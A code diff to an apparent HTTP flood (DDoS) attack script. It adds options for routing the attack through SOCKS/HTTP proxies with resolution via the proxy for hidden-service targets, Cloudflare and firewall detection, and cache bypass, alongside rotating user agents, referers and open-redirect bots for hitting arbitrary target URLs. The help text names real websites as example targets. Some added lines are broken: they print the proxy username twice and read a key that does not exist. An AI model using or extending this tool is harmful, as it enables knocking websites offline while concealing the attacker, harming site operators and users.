@@ -11,17 +11,21 @@ if len(sys.argv) <= 1:
   sys.exit('[ERROR] No/Invalid arguments supplied.')
 else:
   parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://targetdomain.com', allow_abbrev=False)
-  parser.add_argument('-t',   '--target',       dest = 'target',       default = None,     help='Target URL (Example: https://google.com or http://pornhub.com)', type=str)
-  parser.add_argument('-p',   '--port',         dest = 'port',         default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
-  parser.add_argument('-d',   '--duration',     dest = 'duration',     default = 10,       help='Attack duration', type=int)
-  #parser.add_argument(        '--proxy',        dest = 'proxy',        default = None,     help='Use a proxy when attacking, SOCKS5 by default (Example: 127.0.0.1:1337)', type=str)
-  #parser.add_argument(        '--proxy-type',   dest = 'proxy_type',   default = 'SOCKS5', help='Set the proxy type (SOCKS4 or SOCKS5)', type=str)
-  parser.add_argument('-ua',  '--user-agent',   dest = 'useragent',    default = None,     help='User agent to use when attacking, else its dynamic', type=str)
-  parser.add_argument('-ref', '--referer',      dest = 'referer',      default = None,     help='Referer to use when attacking, else its dynamic', type=str)
-  parser.add_argument('-w',   '--workers',      dest = 'workers',      default = 100,      help='Amount of workers/threads to use when attacking', type=int)
-  parser.add_argument('-dbg', '--debug',        dest = 'debug',        default = False,    help='Print info for devs', action='store_true')
-  parser.add_argument('-bc',  '--bypass-cache', dest = 'bypass_cache', default = False,    help='Bypass the cache of the site', action='store_true')
-  parser.add_argument('-m',   '--method',       dest = 'method',       default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
+  parser.add_argument('-t',   '--target',         dest = 'target',         default = None,     help='Target URL (Example: https://google.com or http://pornhub.com)', type=str)
+  parser.add_argument('-p',   '--port',           dest = 'port',           default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
+  parser.add_argument('-d',   '--duration',       dest = 'duration',       default = 10,       help='Attack duration', type=int)
+  parser.add_argument(        '--proxy',          dest = 'proxy',          default = None,     help='Use a proxy when attacking (Example: 127.0.0.1:1337)', type=str)
+  parser.add_argument(        '--proxy-type',     dest = 'proxy_type',     default = 'SOCKS5', help='Set the proxy type (HTTP, SOCKS4 or SOCKS5)', type=str)
+  parser.add_argument(        '--proxy-user',     dest = 'proxy_user',     default = None,     help='Proxy username', type=str)
+  parser.add_argument(        '--proxy-pass',     dest = 'proxy_pass',     default = None,     help='Proxy password', type=str)
+  parser.add_argument(        '--proxy-resolve',  dest = 'proxy_resolve',  default = True,     help='Resolve host using proxy (needed for hidden service targets)', type=str)
+  parser.add_argument('-ua',  '--user-agent',     dest = 'useragent',      default = None,     help='User agent to use when attacking, else its dynamic', type=str)
+  parser.add_argument('-ref', '--referer',        dest = 'referer',        default = None,     help='Referer to use when attacking, else its dynamic', type=str)
+  parser.add_argument('-w',   '--workers',        dest = 'workers',        default = 100,      help='Amount of workers/threads to use when attacking', type=int)
+  parser.add_argument('-dbg', '--debug',          dest = 'debug',          default = False,    help='Print info for devs', action='store_true')
+  parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',   default = False,    help='Bypass the cache of the site', action='store_true')
+  parser.add_argument('-m',   '--method',         dest = 'method',         default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
+  parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall',default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
   args = vars(parser.parse_args())
 
   debug = args['debug']
@@ -40,7 +44,6 @@ try:
   import os
   import threading
   import json
-  #import socks, socket # pysocks is outdated
   import time
   import requests
   from colorama import Fore, init; init()
@@ -52,7 +55,7 @@ try:
   else:
     print(f'{Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}]{Fore.RESET} Modules imported.')
 except Exception as e:
-  print('[ERROR] Failed to import modules, aborting. Please consider "python3 -m pip install -r requirements.txt"')
+  print('[ERROR] Failed to import modules, aborting. Please consider "pip install -r requirements.txt"')
   if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
   exit()
 
@@ -94,9 +97,14 @@ if args['target'] is None:
   sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} No target specified.')
 
 Core.bypass_cache = args['bypass_cache']
+Core.proxy = args['proxy']
+Core.proxy_type = args['proxy_type']
+Core.proxy_user = args['proxy_user']
+Core.proxy_pass = args['proxy_pass']
+Core.proxy_resolve = args['proxy_resolve']
 
-if not args['method'] in method_dict.keys():
-    sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method')
+if not args['method'].upper() in method_dict.keys():
+  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method')
 
 init() # initialize console
 print_lock = threading.Lock() # creates a "lock" variable
@@ -106,48 +114,41 @@ def main():
   with open('src/banner.txt', 'r') as fd:
     [print(line.strip('\n')) for line in fd.readlines()]
   
+  if isCF(socket.gethostbyname(urlparse(args['target']).netloc)):
+    print('\n Target is protected by Cloudflare, attack might not work!\n')
+  
+  if args['detect_firewall']:
+    print(f' Firewall: {fwDetect(args["target"])}')
+  
   print(f'\n Target: [{args["target"]}]')
   print(f' Method: [{args["method"]}]')
   print(f' Duration: [{str(args["duration"])}]')
   print(f' Bypass cache: {str(args["bypass_cache"])}')
   print(f' Workers: [{str(args["workers"])}]\n')
 
-  #if args['proxy'] != None:
-  #  print(f' Proxy: [{str(args["proxy"])}]')
+  if args['proxy'] != None:
+    print(f' Proxy: [{str(args["proxy"])}]')
+    print(f' Proxy type: [{str(args["proxy_type"])}]')
+    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
+    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
   
   if args['useragent'] is None:
-    if debug: s_start = timer()
     print(f' User Agents: [{str(len(ualist))}]')
-    if debug:
-      s_took = "%.2f" % (1000 * (timer() - s_start))
-      print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing user agents took {str(s_took)} ms.')
     
   if args['referer'] is None:
-    if debug: s_start = timer()
     print(f' Referers: [{str(len(reflist)+len(orlist))}]')
-    if debug: 
-      s_took = "%.2f" % (1000 * (timer() - s_start))
-      print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing referers took {str(s_took)} ms.')
   
-  if debug: s_start = timer()
   print(f' Open Redirect bots: [{str(len(orlist))}]')
-  if debug:
-    s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing open redirect bots took {str(s_took)} ms.')
-  
-  if debug: s_start = timer()
   print(f' Keywords: [{str(len(keywords))}]')
-  if debug:
-    s_took = "%.2f" % (1000 * (timer() - s_start))
-    print(f' {fg2}[{fw}DEBUG{fg2}]{frr} Importing keywords took {str(s_took)} ms.')
 
 def attack():
   session = createsession()
   parsed = urlparse(str(args['target']))
-  resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
-
-  if isIPv6(resolved_host): # small IPv6 check
-    resolved_host = f'[{resolved_host}]' # adding 
+  if args['proxy'] is None: # prevents leaks
+    resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
+    if isIPv6(resolved_host): # small IPv6 check
+      resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
+  else: resolved_host = parsed.netloc
 
   s_start = timer() # timer used for counting avg rps
   for i in range(int(args['workers'])):
@@ -181,7 +182,7 @@ if __name__ == '__main__':
   clear()
 
   worker_amount = 20 if args['workers'] > 20 else args['workers']
-  s_start = timer() # timer used for counting rps
+  s_start = timer()
   while Core.attackrunning:
     try:
 
@@ -210,8 +211,6 @@ if __name__ == '__main__':
     
     s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
     attack_length = s_took
-    try: rps = float(total_req)/float(s_took)
-    except: rps = 'None' # error :/
     time_left = float(args["duration"]) - float(attack_length)
     if int(time_left) < 0: time_left = 0
 
@@ -221,7 +220,6 @@ if __name__ == '__main__':
     print(f'   - Requests total: {str(total_req)}')
     print(f'   - Attack took: {str(attack_length)}')
     print(f'   - Time left: {str(time_left)}')
-    print(f'   - Current Requests per second: '+str(rps).replace('.', f'.{fg2}')+frr)
 
     time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
     if Core.attackrunning: 
